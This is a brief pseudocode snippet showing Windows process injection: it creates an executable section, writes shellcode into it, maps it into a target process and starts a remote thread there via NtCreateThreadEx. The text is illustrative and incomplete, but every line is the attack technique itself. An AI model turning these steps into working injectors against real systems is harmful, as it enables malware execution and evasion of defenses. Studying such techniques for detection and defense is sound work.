// Simplified pseudocode illustrating shellcode injection with NtWriteVirtualMemory + NtMapViewOfSection

// 1. Create a section object with execute permissions
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

// 2. Map the section into the current process so we can write shellcode to it
NtMapViewOfSection(hSection, GetCurrentProcess(), &localBaseAddress, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_READWRITE);

// 3. Write shellcode into the mapped section (could use memcpy or NtWriteVirtualMemory)
memcpy(localBaseAddress, shellcode, sizeof(shellcode));

// 4. Map the same section into the target process with execute permissions
NtMapViewOfSection(hSection, hTargetProcess, &remoteBaseAddress, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READ);

// 5. Create a remote thread (or hijack an existing thread) to execute the shellcode at remoteBaseAddress
NtCreateThreadEx(..., remoteBaseAddress, ...);
